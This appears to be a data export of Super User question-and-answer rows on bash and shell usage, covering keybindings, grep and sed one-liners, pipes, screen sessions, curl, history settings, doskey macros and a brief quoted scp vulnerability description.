<p>Different terminals may handle <kbd>Alt</kbd>-<kbd>Backspace</kbd> differently.</p>

<ul>
<li>PuTTY and GNOME Terminal (with default settings) send <code>1b 7f</code> (<code>ESC DEL</code>)</li>
<li>Xterm with <code>metaSendsEscape: true</code> sends <code>1b 08</code> (<code>ESC BS</code>).</li>
<li>Xterm <em>without</em> <code>metaSendsEscape</code> sends <code>88</code> (<a href=""http://en.wikipedia.org/wiki/C0_and_C1_control_codes#C1_.28ISO_8859_and_Unicode.29""><code>HTS</code></a>, or <code>BS</code> with highest bit set).</li>
</ul>

<p>Xterm has a few settings to control the behavior of <kbd>Alt</kbd> key (called <kbd>Meta</kbd> in Xterm and X11 in general). With <code>metaSendsEscape</code>, holding <kbd>Alt</kbd> will prefix the keypress with an <code>ESC</code> (hex <code>1b</code>). Without the setting (default mode), <kbd>Alt</kbd> will set the highest bit of the input character, resulting in special characters. (For example, <kbd>Alt</kbd>-<kbd>N</kbd> results in <code>ESC n</code> and <code>î</code> respectively.)</p>

<p>As far as I can remember, Terminal.app also has a similar setting to control the behavior of Meta/Alt/whatever-Macs-use.</p>
"
"How to automatically run commands on SSH login?","355029","<linux><bash><centos>","23","<p>Put the commands in <code>~/.bashrc</code>. Anything in there is executed each time you log in.</p>

<p>If you need commands to only run when logging in via ssh (but not when logging in physically), you could probably test for the presence of the <code>SSH_CONNECTION</code> environment variable, and only run the commands if you find it exists.</p>
"
"Search for a text pattern in linux","215896","<linux><bash>","23","<p>The easiest way is to use GNU grep's features:</p>

<pre><code>grep -r --include '*.java' teststring /home/user1
</code></pre>

<p>If you're ever on another unix variant that doesn't have GNU grep, here's a portable way:</p>

<pre><code>find /home/user1 -name '*.java' -exec grep teststring {} +
</code></pre>
"
"No available formula for “pdfunite” in Homebrew?","897670","<macos><mac><command-line><bash><homebrew>","22","<p>To have <code>pdfunite</code> working on OSX, you need to install <a href=""http://www.linuxfromscratch.org/blfs/view/7.7/general/poppler.html""><code>poppler</code></a>—which is described as “…a PDF rendering library and command line tools used to manipulate PDF files.”—instead:</p>

<pre><code>brew install poppler
</code></pre>
"
"How to remove 'connection to xx.xxx.xx.xxx closed' message?","457316","<linux><bash><ssh>","22","<p>That is coming from SSH.  You see it because you gave the <code>-t</code> switch, which forces SSH to allocate a <a href=""http://en.wikipedia.org/wiki/Pseudo_terminal"" rel=""noreferrer"">pseudo-terminal</a> for the connection.  Traditionally, SSH displays that message to make it clear that you are no longer interacting with the shell on the remote host, which is normally only a question when SSH has a pseudo-terminal allocated.</p>
"
"How to force Network Manager to rescan connections?","164059","<ubuntu><wireless-networking><bash><networkmanager>","22","<pre><code>sudo iwlist interface scan
</code></pre>

<p>Where <em>interface</em> is the name of your wireless card, e. g. wlan0 </p>
"
"A command before every bash command","117227","<command-line><bash><shell>","22","<p>Sorry for the wrong answer before, I missunderstood your question.</p>

<p>To have the time added before every command that you execute on the shell you can do something like this</p>

<pre><code>bind 'RETURN: ""\e[1~time \e[4~\n""'
</code></pre>

<p>This will rebind the return key. Now every time you press return instead of writing a newline \n it will go to the beginning of the line, enter the text 'time' and a space, go to the end of the line and enter the newline \n thereby producing the desired effect.</p>

<p>If you don't want to sacrifice your Enter Key you could make a 'second' benchmark-enter Key like F12 by binding the command like this</p>

<pre><code>bind '""\e[24~"": ""\e[1~time \e[4~\n""'
</code></pre>

<p>Now instead of replacing the return key you bound F12.</p>

<p>The background of all this is that bash uses GNU readline to read commands. So readline would be a good starting point for further command manipulation, etc.</p>
"
"Execute a terminal command without saving it to .bash_history on OS X?","324874","<macos><command-line><bash><terminal><history>","22","<p>Add the following line to ~/.bashrc</p>

<pre><code>export HISTCONTROL=ignorespace
</code></pre>

<p>Then <code>source ~/.bashrc</code> to refresh the settings</p>

<p>This should enable that feature in bash. If it doesn't work, you might have to add it to ~/.bash_profile instead of ~/.bashrc since OS X loads them a bit differently than linux I think.</p>
"
"Last parameter of last command in bash in vi-mode","18498","<bash>","22","<p>There's no default. The binding for 'yank-last-arg' (as listed by 'bind -p') disappears when you switch to vi mode.</p>

<pre><code>bind '""\e.""':yank-last-arg
</code></pre>

<p>will give you that same binding back (or pick something else)</p>
"
"How can I start multiple screen sessions automatically?","386059","<linux><bash><gnu-screen>","22","<p><code>screen -dmS ""$SESSION_NAME"" ""$COMMAND"" ""$ARGUMENTS""</code> will spawn a screen running <code>$COMMAND</code> in the background.</p>

<p>You can see active sessions with <code>screen -ls</code> and reattach with <code>screen -r ""$SESSION_NAME""</code>.</p>

<p>Dead sessions can be killed with <code>screen -wipe</code>.</p>
"
"Why does the output of some Linux programs go to neither STDOUT nor STDERR?","614995","<linux><bash><gnu><stdout><stderr>","22","<p>This question is addressed in <a href=""http://mywiki.wooledge.org/BashFAQ/032"" rel=""noreferrer"">BashFAQ/032</a>. In your example, you would:</p>

<pre><code>{ time sleep 1; } 2&gt; /dev/null
</code></pre>

<p>The reason why</p>

<pre><code>time sleep 1 2&gt;/dev/null
</code></pre>

<p>doesn't behave how you're expecting is because with that syntax, you'll want to <code>time</code> the command <code>sleep 1 2&gt;/dev/null</code> (yes, the command <code>sleep 1</code> with <em>stderr</em> redirected to <code>/dev/null</code>). The builtin <code>time</code> works that way so as to make this actually possible.</p>

<p>The <code>bash</code> <em>builtin</em> can actually do this because... well, it's a builtin. Such a behavior would be impossible with the external command <code>time</code> usually located in <code>/usr/bin</code>. Indeed:</p>

<pre><code>$ /usr/bin/time sleep 1 2&gt;/dev/null
$
</code></pre>

<p>Now, the answer to your question</p>

<blockquote>
  <p>Why does the output of some linux programs go to neither STDOUT nor STDERR?</p>
</blockquote>

<p>is: it does, the output goes to <em>stdout</em> or <em>stderr</em>.</p>

<p>Hope this helps!</p>
"
"Pop-Up Notification when time reaches 4:00PM?","38654","<linux><ubuntu><bash><notifications><notify-osd>","22","<p>As many of the other commenters said, the best way to do this on a daily basis is to use cron, but if you are only wanting to do it for one day, or sporadically, you can use the <code>at</code> command: </p>

<pre><code>echo 'notify-send ""Work day is done!""' | at 4:00PM 
</code></pre>

<p>You can use <code>at</code> in a variety of ways, including as a tea timer: </p>

<pre><code>echo 'notify-send ""Get your tea!""' | at now + 3 minutes 
echo 'notify-send ""Meeting in 1 hour with the big boss!""' | at 1pm tomorrow 
</code></pre>

<p>It's quite useful for those one-off commands. </p>

<p>Check the <a href=""https://tecadmin.net/one-time-task-scheduling-using-at-commad-in-linux/"" rel=""noreferrer"">at manpage</a> for more syntax goodness. </p>
"
"How can I prevent or interrupt accidental copy/paste in the terminal?","355383","<linux><bash><terminal><copy-paste><urxvt>","22","<p>To safely paste, you could invoke a text editor in bash using <kbd>CTRL</kbd> + <kbd>X</kbd> / <kbd>E</kbd>.  The shell builtin <code>fc</code> will bring up an editor with the last command.</p>

<p>Short of killing the shell/terminal, I am not sure if there is any way to kill something after you have pasted something in, and it has gone wrong.</p>
"
"How to create a directory named '-p' under Linux with Bash?","738583","<linux><bash>","22","<p>Most utilities (all POSIX compliant ones except for <code>test</code> and <code>echo</code>) support an <a href=""http://wiki.bash-hackers.org/dict/terms/end_of_options"" rel=""nofollow noreferrer"">""end of options"" option</a> <code>--</code>, so you could run:</p>

<pre><code>mkdir -- -p
</code></pre>

<p>This is especially useful when renaming or removing files that could potentially start with a dash. In scripts you should always use</p>

<pre><code>mv -- ""$filename""
</code></pre>

<p>instead of a plain <code>mv ""$filename""</code> or, even worse, an unquoted filename.</p>
"
"remove first line in bash","284258","<bash>","22","<p>One-liners in reverse order of length, portable unless noted.</p>

<p><code>sed</code> (needs <code>GNU sed</code> for <code>-i</code>):</p>

<pre><code>sed -i 1d file
</code></pre>

<p><a href=""https://superuser.com/questions/284258/remove-first-line-in-bash#comment296581_284270""><code>ed</code></a> (needs e.g. <code>bash</code> for <code>$'...'</code> expansion and here string):</p>

<pre><code>ed file &lt;&lt;&lt; $'1d\nw\nq'
</code></pre>

<p><code>awk</code>:</p>

<pre><code>awk NR\&gt;1 infile &gt; outfile
</code></pre>

<p><a href=""https://superuser.com/questions/284258/remove-first-line-in-bash#284261""><code>tail</code></a>:</p>

<pre><code>tail -n +2 infile &gt; outfile
</code></pre>

<p><code>read</code> + <code>cat</code>:</p>

<pre><code>(read x; cat &gt; outfile) &lt; infile
</code></pre>

<p><code>bash</code> built-ins:</p>

<pre><code>while IFS= read -r; do ((i++)) &amp;&amp; printf %s\\n ""$REPLY"" &gt;&gt; outfile; done &lt; infile
</code></pre>
"
"What does the linux pipe symbol ""|"" do?","756158","<linux><command-line><bash><pipe>","22","<p><em>The following is simplified a bit to help new users.</em></p>

<p>Well, first, it's necessary to understand the concept of standard input and standard output.</p>

<p>In Linux and other UNIX-like operating systems, each process has a standard input (<code>stdin</code>) and a standard output (<code>stdout</code>).  The usual situation is that <code>stdin</code> is your keyboard and <code>stdout</code> is your screen or terminal window.</p>

<p>So when you run <code>ls</code>, it will throw it's output to <code>stdout</code>.  If you do nothing else, it will go to your screen or terminal window, and you will view it.</p>

<p>Now, some Linux commands interact with the user, and use <code>stdin</code> to do that, your text editor being one of those.  It reads from <code>stdin</code> to accept your keystrokes, do things, and then writes stuff to <code>stdout</code>.</p>

<p>However, there are also non-interactive or ""filter"" commands that do NOT work interactively, but want a bunch of data.  These commands will take everything <code>stdin</code> has, do something to it, and then throw it to <code>stdout</code></p>

<p>Let's look at another command called <code>du</code> - stands for disk usage.  <code>du /usr</code>, for example, will print out (to <code>stdout</code> like any other Linux command) a list of every file in that directory and it's size:</p>

<pre><code># du /usr
2312    /usr/games
124     /usr/lib/tc
692     /usr/lib/rygel-1.0
400     /usr/lib/apt/methods
40      /usr/lib/apt/solvers
444     /usr/lib/apt
6772    /usr/lib/gnash
</code></pre>

<p>As you can tell right off the bat, it isn't sorted, and you probably want it sorted in order of size.</p>

<p><code>sort</code> is one of those ""filter"" commands that will take a bunch of stuff from <code>stdin</code> and sort it.</p>

<p>So, if we do this:</p>

<p><code># du /usr | sort -nr</code></p>

<p>we get this, which is a bit better:</p>

<pre><code>4213348 /usr
2070308 /usr/lib
1747764 /usr/share
583668  /usr/lib/vmware
501700  /usr/share/locale
366476  /usr/lib/x86_64-linux-gnu
318660  /usr/lib/libreoffice
295388  /usr/lib/vmware/modules
290376  /usr/lib/vmware/modules/binary
279056  /usr/lib/libreoffice/program
216980  /usr/share/icons
</code></pre>

<p>And you can now see that the ""pipe"" connects the <code>stdout</code> of one command to the <code>stdin</code> of another.  Typically you will use it in situations like this where you want to filter, sort or otherwise manipulate the output of a command.  They can be cascaded if you want to process output through multiple filter-type commands.</p>

<p>If you type <code>sort</code> by itself, it will still try to read from <code>stdin</code>.  Since <code>stdin</code> is connected to your keyboard, it will be waiting for you to type, and process things until you press Control-D.  It won't prompt you since it's not really meant to be used interactively. </p>

<p>It's possible for a program to tell whether <code>stdin</code> is interactive or not, so some programs may act differently if you issue them by themselves or at the end of a pipe.</p>

<p>Also, piping a program that only works interactively, like <code>vi</code>, will result in you having a bad time.</p>

<p>Pipes are different from redirection in that the data shuffled from one command to the next without being stored anywhere.  So, In the above example, <code>du</code>'s output is not stored anywhere.  The majority of the time you don't want this with pipes because the reason to use pipes is to process the output of a command in some way - but, there is a command <code>tee</code> that lets you have your cake and eat it too, it will copy what it receives from <code>stdin</code> to both <code>stdout</code> and a file of your choosing.  You can also likely do this from <code>bash</code> with some arcane syntax involving ampersands and brackets that I don't know about.</p>
"
"Man pages for Git Bash on Windows 7","295398","<windows-7><bash><git><man>","22","<p>You could use the online documentation.</p>

<p><a href=""http://man.he.net/"" rel=""nofollow noreferrer"">Linux man pages online</a> &amp; <a href=""http://www.gnu.org/manual/manual.html"" rel=""nofollow noreferrer"">GNU Info Pages</a></p>
"
"command-line utility to record from microphone","384748","<linux><bash><audio><command-line><sox>","22","<p>From <a href=""http://dabase.com/u/record_wav/"" rel=""noreferrer"">http://dabase.com/u/record_wav/</a></p>

<pre><code>arecord -vv -fdat stackoverflow.wav
</code></pre>
"
"How to POST file contents using cURL?","1054742","<bash><shell><shell-script><curl>","22","<p>According to the last section of <strong>-d</strong> in <strong>man curl</strong>:</p>

<p>If you start the data with the letter @, the rest  should  be  a file  name  to read the data from, or - if you want curl to read the data from stdin. Multiple files can also be specified. Posting  data  from  a  file  named 'foobar' would thus be done with
--data @foobar. When --data is told to read  from  a  file  like that, carriage returns and newlines will be stripped out.</p>

<p>That is you don't have to do anything fancy just prepend your filename with a <strong>@</strong>.</p>
"
"Terminal *output* history?","186805","<bash><history><byobu>","22","<p>You mention using <a href=""http://manpg.es/byobu"" rel=""nofollow noreferrer"">byobu</a>...</p>

<p>That's certainly one way of doing it.  Byobu stores 10K lines of scrollback history per window or per split (pane).</p>

<p>You can enter scrollback easily by pressing <kbd>Alt</kbd>-<kbd>PageUp</kbd>, <kbd>Alt</kbd>-<kbd>PageDown</kbd>, or <kbd>F7</kbd>.  Once you're in scrollback mode, you can search forward and backward using vi-like commands.  Use <kbd>/</kbd><code>regex</code> to search forward, and <kbd>?</kbd><code>regex</code> to search backward.</p>
"
"What is the maximum value of a numeric bash shell variable?","1030122","<bash><shell><script>","21","<p>It may come down to your version of bash, your OS, and your CPU architecture. Why don't you try it yourself? Set a variable to (2^31)-1, then increment it, set it to 2^32, then increment it, set it to 2^64, then increment it, etc.</p>

<p>Here, I just tried it myself on my Core i7 Mac running OS X ""El Capitan"" v10.11.3, and it looks like bash is using signed 64-bit integers.</p>

<pre>
$ uname -a
Darwin Spiff.local 15.3.0 Darwin Kernel Version 15.3.0: Thu Dec 10 18:40:58 PST 2015; root:xnu-3248.30.4~1/RELEASE_X86_64 x86_64
$ bash --version
bash --version
GNU bash, version 3.2.57(1)-release (x86_64-apple-darwin15)
Copyright (C) 2007 Free Software Foundation, Inc.
$
$ ((X=2**16)); echo $X
65536                        &lt;-- okay, at least UInt16
$ ((X=2**32)); echo $X
4294967296                   &lt;-- okay, at least UInt32
$ ((X=2**64)); echo $X
0                            &lt;-- oops, not UInt64
$ ((X=(2**63)-1)); echo $X
9223372036854775807          &lt;-- okay, at least SInt64
$ ((X++)); echo $X
-9223372036854775808         &lt;-- overflowed and wrapped negative. Must be SInt64
</pre>
"
"Writing shell scripts that will run on any shell (using multiple shebang lines?)","502984","<bash><shell><shell-script><zsh><bash-scripting>","21","<blockquote>
  <p>Which shell executes scripts when there's no shebang line (#!/path/to/shell) at the beginning? I assume /bin/sh but I can't confirm.</p>
</blockquote>

<p>The kernel refuses to execute such scripts and returns ENOEXEC, so the exact behavior depends on the program you run such a script <em>from</em>.</p>

<ul>
<li>bash 4.2.39 – uses itself</li>
<li>busybox-ash 1.20.2 – uses itself</li>
<li>dash 0.5.7 – runs /bin/sh</li>
<li>fish 1.23.1 – complains about ENOEXEC, then blames the wrong file</li>
<li>AT&amp;T ksh 93u+2012.08.01 – uses itself</li>
<li>mksh R40f – runs /bin/sh</li>
<li>pdksh 5.2.14 – runs /bin/sh</li>
<li>sh-heirloom 050706 – uses itself</li>
<li>tcsh 6.18.01 – runs /bin/sh</li>
<li>zsh 5.0.0 – runs /bin/sh</li>
<li>cmd.exe 5.1.2600 – looks at you funny.</li>
</ul>

<p>In <em>glibc</em>, functions <code>execv()</code> or <code>execve()</code> just return ENOEXEC. But <code>execvp()</code> hides this error code and automatically invokes /bin/sh. (This is documented in <a href=""http://manpages.ubuntu.com/manpages/precise/en/man3/exec.3posix.html"" rel=""noreferrer"">exec(3p)</a>.)</p>

<blockquote>
  <p>What is considered ""best practices"" in terms of writing shell scripts that will run on any platform? (ok, this is sort of open-ended)</p>
</blockquote>

<p>Either stick to <code>sh</code> and only POSIX-defined features, or just go full <em>bash</em> (which is widely available) and mention it in your requirements if distributing it.</p>

<p>(Now that I think of it, Perl – or perhaps Python – would be even more portable, not to mention having a better syntax.)</p>

<p><strong>Always</strong> add the shebang line. If using bash or zsh, use <code>#!/usr/bin/env bash</code> instead of hardcoding the shell's path. (However, the POSIX shell is guaranteed to be at <code>/bin/sh</code>, so skip <code>env</code> in that case.)</p>

<p>(Unfortunately, even <code>/bin/sh</code> is not always the same. The GNU <em>autoconf</em> program has to deal with <a href=""http://www.gnu.org/savannah-checkouts/gnu/autoconf/manual/autoconf-2.69/html_node/Portable-Shell.html"" rel=""noreferrer"">many different quirks</a>.)</p>

<blockquote>
  <p>Is it possible to write a script that tries to use zsh and falls back to bash if zsh is not available? I've tried putting two shebang lines, like below, but it just errors with <em>bad interpreter: /bin/zsh: no such file or directory</em> out if I try it on a machine without zsh.</p>
</blockquote>

<p>There can only be one shebang line; everything after the newline character isn't even read by the kernel, and treated as a comment by shells.</p>

<p>It's <em>possible</em> to write a script that runs as <code>#!/bin/sh</code>, checks which shell is available, and runs <code>exec zsh ""$0"" ""$@""</code> or <code>exec bash ""$0"" ""$@""</code> depending on the result. However, the syntax used by bash and zsh is so different in various places that I would <strong>not recommend doing this</strong> for your own sanity.</p>
"
"How can I ring the audio bell within a bash script running under gnu screen?","806511","<linux><bash><terminal><gnu-screen><konsole>","21","<p>From memory, Ctrl-G is the bell character, so I think that's why the second one worked.
But screen can be picky over what characters it accepts as it takes Ctrl-A as the command code.</p>

<p>Try this </p>

<pre><code>#!/bin/sh
# Ring the terminal bell
# echo ""\a"" # does not work in some shells
tput bel
</code></pre>

<p>I found this on <a href=""http://rosettacode.org/wiki/Terminal_control/Ringing_the_terminal_bell"">rosettacode</a>, hopefully it will give you some options</p>
"
"How do I concatenate strings in a bash script?","238683","<bash><script><shell-script>","21","<p>Nothing special, you just need to add them to your declaration.<br>
For example: </p>

<pre><code>stringOne=""foo""
stringTwo=""anythingButBar""
stringThree=$stringOne$stringTwo
echo $stringThree 
</code></pre>

<blockquote>
  <p>fooanythingButBar</p>
</blockquote>

<p>if you want the literal word 'and' between them: </p>

<pre><code>stringOne=""foo""
stringTwo=""anythingButBar""
stringThree=""$stringOne and $stringTwo""
echo $stringThree 
</code></pre>

<blockquote>
  <p>foo and anythingButBar</p>
</blockquote>
"
"Should I put *.sh and *.rb file extensions on all my scripts?","344093","<bash><script><shell-script>","21","<p>You can do wildcard commands like <code>ls *.rb</code> or <code>cp *.sh</code> if you want to organize your scripts in the future.</p>

<p>Start early or regret later, in my opinion.</p>

<p>Editors like <code>vim</code> will also be able to apply the correct syntax highlighting based on <a href=""https://en.wikipedia.org/wiki/Shebang_(Unix)"" rel=""noreferrer"">shebang</a> or file extension.</p>

<p>This can also be accomplished by using modelines in various editors. E.g. for vim:</p>

<pre><code># vim: ft=sh
</code></pre>
"
"Bash: can I set Ctrl-Backspace to delete the word backward?","402246","<bash>","21","<p>Why not just use <kbd>Alt</kbd>+<kbd>Backspace</kbd> or <kbd>Ctrl</kbd>+<kbd>W</kbd> that are already mapped in most terminals. Not sure about Console. Xmodmap (man xmodmap) may be used to remap other custom keys as well. (Paradoxically, xmodmap can't remap Backspace very well because the terminal overrides the mappings, but it works well with most keys...).</p>
"
"scp: error: unexpected filename:","1403473","<bash><scp>","21","<p>The culprit is <a href=""https://nvd.nist.gov/vuln/detail/CVE-2018-20685"" rel=""noreferrer"">CVE-2018-20685</a>, whose description is:</p>

<blockquote>
  <p>In OpenSSH 7.9, scp.c in the scp client allows remote SSH servers to
  bypass intended access restrictions via the filename of . or an empty
  filename. The impact is modifying the permissions of the target
  directory on the client side.</p>
</blockquote>

<p>This is part of a <a href=""https://sintonen.fi/advisories/scp-client-multiple-vulnerabilities.txt"" rel=""noreferrer"">larger set of SCP vulnerabilities</a>. Quoting from there:</p>

<blockquote>
  <h2>Overview</h2>
  
  <p>SCP clients from multiple vendors are susceptible to a malicious scp
  server performing unauthorized changes to target directory and/or
  client output manipulation.</p>
  
  <h2>Description</h2>
  
  <p>Many scp clients fail to verify if the objects returned by the scp
  server match those it asked for. This issue dates back to 1983 and
  rcp, on which scp is based. A separate flaw in the client allows the
  target directory attributes to be changed arbitrarily. Finally, two
  vulnerabilities in clients may allow server to spoof the client
  output.</p>
</blockquote>

<p>The <a href=""https://github.com/openbsd/src/commit/4667d15cf6214d4cb6b8c347f13864ca8c72002e"" rel=""noreferrer"">commit</a> that patched this vulnerability in OpenBSD was made on Nov. 16, 2018</p>
"
"Best practices to alias the rm command and make it safer","382407","<bash><shell><unix><script><rm>","21","<p>If you want a customized <code>rm</code>, don't call it <code>rm</code> but a name of yours, <code>myrm</code>, <code>delete</code> or whatever.</p>

<p>The <code>rm='rm -i'</code> alias is an horror because after a while using it, you will expect <code>rm</code> to prompt you by default before removing files. Of course, one day you'll run it with an account that hasn't that alias set and before you understand what's going on, it is too late.</p>

<p>In any case, a good way to be prepared for file loss or corruption is doing backups.</p>

<p>A fast alternative that will protect you against accidental file deletion or overwriting is using a file system that support unlimited snapshots like ZFS. If frequent snapshots are done automatically, you can recover the files at the state they were during the last snapshot before the incident.
&nbsp;</p>
"
"How to prevent a password or other sensitive information from being stored in the bash history when using grep?","624149","<bash><grep>","21","<p>If you put <code>HISTCONTROL=ignorespace</code> in your .bashrc, and you put a space before the command name, it will not be added to your history.</p>

<pre><code>$ export HISTCONTROL=ignorespace
$ grep ""passwd"" secret_password_file.txt   # added to history
$  grep ""passwd"" secret_password_file.txt  # not added to history
</code></pre>
"
"avoid permission denied spam when using find-command","179978","<bash><find>","21","<p>Try</p>

<pre><code>find . -name ""filetofind"" 2&gt;/dev/null
</code></pre>

<p>This will redirect <code>stderr</code> output stream, which is used to report all errors, including ""Access denied"" one, to null device.</p>
"
"Windows command-line: create a file with the current date in its name","47885","<windows><bash><environment-variables>","21","<p>You can replace symbols in variables by using :</p>

<pre><code>set _date=%DATE:/=-%
</code></pre>
"
"Is it safe to open a file that is being written by a running script?","1320168","<linux><command-line><bash><filesystems><bash-scripting>","21","<p>Reading the file is safe, although double clicking you mentioned will probably open the file in some editor that will offer you an option to make changes and save them. Missclicks happen, so I recommend commands that won't even let you change the file.</p>

<p>These are examples that work in terminal; they will only read the file:</p>

<pre><code>cat file
less file
less +F file
tail -n 5 file
tail -f file
</code></pre>
"
"How do you escape apostrophe in single quoted string in bash?","481797","<bash><shell-script><string><escape-characters>","21","<p>In single quotes, no escaping is possible. There is no way how to include a single quote into single quotes. See <em>Quoting</em> in <a href=""http://linux.die.net/man/1/bash"" rel=""noreferrer"">man bash</a>.</p>
"
"How to get a colored tab completion?","251107","<bash>","21","<p>There's no facility within Bash to color output during completion as there is in fish and zsh. One could write completion functions that output color control sequences, but you'd have to maintain copies of the proposed completions with and without color codes or strip the out when the user makes a selection since Bash uses the selection directly normally and the color codes would get in the way.</p>

<p>If this is an important feature for you, I would recommend that you consider using zsh.</p>

<p><strong>Update</strong></p>

<p>Bash 4.3 readline adds a variable that enables color for tab completion to show different colors for executable files, directories, etc., during tab completion:</p>

<pre><code>colored-stats
</code></pre>

<p>Readline in the upcoming Bash 4.4 adds a variable which enables color to indicate the matching portion of the string during tab completion.</p>

<pre><code>colored-completion-prefix
</code></pre>

<p>You can see the values of these variables using</p>

<pre><code>bind -v | grep color
</code></pre>

<p>To set them, add lines(s) to your <code>~/.inputrc</code> file such as:</p>

<pre><code>set colored-stats on
</code></pre>
"
"Remote SSH Commands - bash bind warning: line editing not enabled","892658","<bash><ssh><shell>","21","<p>Having an interactive session is not enough for <code>bind</code> to work. For instance emacs shell provides an interactive session which passes the <code>if [ -t 1 ]</code> test but it does not have the line editing so any <code>bind</code>s in your <code>~/.bashrc</code> will generate the warnings. Instead, you can check if the line editing is enabled by doing something like this (is there a simpler/better way?):</p>

<pre><code>if [[ ""$(set -o | grep 'emacs\|\bvi\b' | cut -f2 | tr '\n' ':')"" != 'off:off:' ]]; then
  echo ""line editing is on""
fi
</code></pre>
"
"Create permanent DOSKEY in Windows cmd","1134368","<windows><command-line><bash><alias>","21","<p>Create a <a href=""http://ss64.com/nt/doskey.html"" rel=""noreferrer"">macro definition file</a>, for instance in <code>notepad</code>; name it at will and save it anywhere (for instance, in next example I used filename <code>macros.doskey</code> in <code>d:\bat\</code> folder). 
<BR>Alternatively, <code>doskey /macros&gt;d:\bat\macros.doskey</code> command will list <em>all current macro definitions</em> into <code>d:\bat\macros.doskey</code> file. 
<BR>A sample macro definition file could be as follows (note that <code>==&gt;</code> is my command prompt specified by <a href=""http://ss64.com/nt/prompt.html"" rel=""noreferrer""><code>prompt $Q$Q$G$S</code> command</a>):</p>

<pre><code>==&gt; type d:\bat\macros.doskey
ls=dir /B $1 
ip=ipconfig $*
</code></pre>

<p>Then, next commands should do the job:</p>

<pre><code>==&gt; reg add ""HKCU\Software\Microsoft\Command Processor"" /v Autorun /d ""doskey /macrofile=\""d:\bat\macros.doskey\"""" /f
The operation completed successfully.

==&gt; reg query ""HKCU\Software\Microsoft\Command Processor"" /v Autorun

HKEY_CURRENT_USER\Software\Microsoft\Command Processor
    Autorun    REG_SZ    doskey /macrofile=""d:\bat\macros.doskey""
</code></pre>

<p>For explanation, read <code>cmd /?</code>:</p>

<blockquote>
  <p>If <code>/D</code> was NOT specified on the command line, then when <code>CMD.EXE</code>
  starts, it looks for the following <code>REG_SZ</code>/<code>REG_EXPAND_SZ</code> registry
  variables, and if either or both are present, they are executed first.</p>

<pre><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\AutoRun
</code></pre>
  
  <p>and/or</p>

<pre><code>HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun
</code></pre>
</blockquote>

<p><strong>Disclaimer</strong>: some <code>AutoRun</code> settings could eventuate in unlooked-for unwanted behaviour, e.g. as decribed in <a href=""https://blogs.msdn.microsoft.com/oldnewthing/20071121-00/?p=24433"" rel=""noreferrer"">Hidden gotcha: The command processor’s AutoRun setting</a></p>

<p>Read <a href=""http://ss64.com/nt/doskey.html"" rel=""noreferrer"">Save and restore macro definitions</a>; you could prepare a valid <code>macros.cmd</code> script file in one step:</p>

<pre><code>==&gt; &gt;macros.cmd (@for /F ""delims="" %G in ('doskey /macros') do @echo DOSKEY %G)

==&gt; type macros.cmd
DOSKEY ip=ipconfig $*
DOSKEY ls=dir /B $1

==&gt;
</code></pre>

<p>Please keep in mind that <strong>you cannot run a Doskey macro from a batch file</strong>.</p>
"
"Bash: detect execute vs source in a script?","731425","<bash>","21","<p>In a shell script, <code>$0</code> is the name of the currently running script.  You can use this to tell if you're being sourced or run like this:</p>

<pre><code>if [[ ""$(basename -- ""$0"")"" == ""script.sh"" ]]; then
    echo ""Don't run $0, source it"" &gt;&amp;2
    exit 1
fi
</code></pre>
"
"Why does wget give an error when executed with sudo, but works fine without?","979113","<bash><sudo><wget>","21","<p>You have a proxy defined in your environment.  Yours appears to be <code>127.0.0.1:3128</code>.</p>

<p>When you run <code>sudo</code>, the proxy environment variable isn't passed, which is why you can't directly resolve <code>google.com</code>.</p>

<p>You can see what proxy/proxies you have defined in your environment variables with this command:</p>

<pre><code>env | grep proxy
</code></pre>

<p><em><sup><sub><a href=""https://askubuntu.com/a/3808/18979"">Additional information on Ask Ubuntu</a></sub></sup></em></p>

<p><strong>Note:</strong> If you want <code>sudo</code> to pass the HTTP proxy environment variable, try this:</p>

<pre><code>sudo http_proxy=""$http_proxy"" wget -q --tries=10 --timeout=20 --spider http://google.com
</code></pre>

<p>You can also pass all environment variables using <code>sudo -E</code>:</p>

<pre><code>sudo -E wget -q --tries=10 --timeout=20 --spider http://google.com
</code></pre>

<p><em><sup><sub><a href=""https://stackoverflow.com/q/8633461/1038828"">Stack Overflow has other options for keeping the environment variable when <code>sudo</code>ing.</a></sub></sup></em></p>
"
"How is install -c different from cp","229883","<linux><installation><bash><cp><sh>","21","<p>One significant difference is that cp truncates the destination file and starts copying data from the source into the destination file.</p>

<p>install, on the other hand, removes the destination file first.</p>

<p>This is significant because if the destination file is already in use, bad things could happen to whomever is using that file in case you <code>cp</code> a new file on top of it. e.g. overwriting an executable that is running might fail. Truncating a data file that an existing process is busy reading/writing to could cause pretty weird behavior. If you just remove the destination file first, as install does, things continue much like normal - the removed file isn't actually removed until all processes close that file.</p>
"
"how to stop cp: overwrite './xxx' ? prompt","472266","<linux><bash><centos><cp>","20","<p>In addition to calling <code>/bin/cp</code>, you could do one of:</p>

<pre><code>\cp -f ...
command cp -f ...
</code></pre>

<p>However, I agree that you should not get accustomed to using an alias like <code>cp -i</code> or <code>rm -i</code> -- if you sit down at a different shell, you won't have the safety net you've become dependent on.</p>
"
"Bash readline deleting till the previous slash","606212","<linux><bash><readline>","20","<pre><code>bind -P |grep unix-filename-rubout
</code></pre>

<p>To test out the keybinding with eg. <kbd>Ctrl</kbd>-<kbd>b</kbd>:</p>

<pre><code>bind \\C-b:unix-filename-rubout
</code></pre>

<p>For permanent usage, add it to <code>~/.inputrc</code></p>
"
"How to get only the user, the pid and the command run for a specific process? (Ubuntu 11.10)","568245","<linux><bash><ps>","20","<p>I guess you are looking for the -o argument:</p>

<blockquote>
  <p>-o format:</p>
  
  <p>user-defined format.
  format is a single argument in the form of a
  blank-separated or comma-separated list, which offers a
  way to specify individual output columns. The
  recognized keywords are described in the STANDARD
  FORMAT SPECIFIERS section below. Headers may be renamed
  (ps -o pid,ruser=RealUser -o comm=Command) as desired.
  If all column headers are empty (ps -o pid= -o comm=)
  then the header line will not be output. Column width
  will increase as needed for wide headers; this may be
  used to widen up columns such as WCHAN
  (ps -o pid,wchan=WIDE-WCHAN-COLUMN -o comm). Explicit
  width control (ps opid,wchan:42,cmd) is offered too.
  The behavior of ps -o pid=X,comm=Y varies with
  personality; output may be one column named ""X,comm=Y""
  or two columns named ""X"" and ""Y"". Use multiple -o
  options when in doubt. Use the PS_FORMAT environment
  variable to specify a default as desired; DefSysV and
  DefBSD are macros that may be used to choose the
  default UNIX or BSD columns.</p>
</blockquote>

<p>So the command you want would be (Ubuntu):</p>

<pre><code>ps -o uid,pid,cmd -ef|grep python
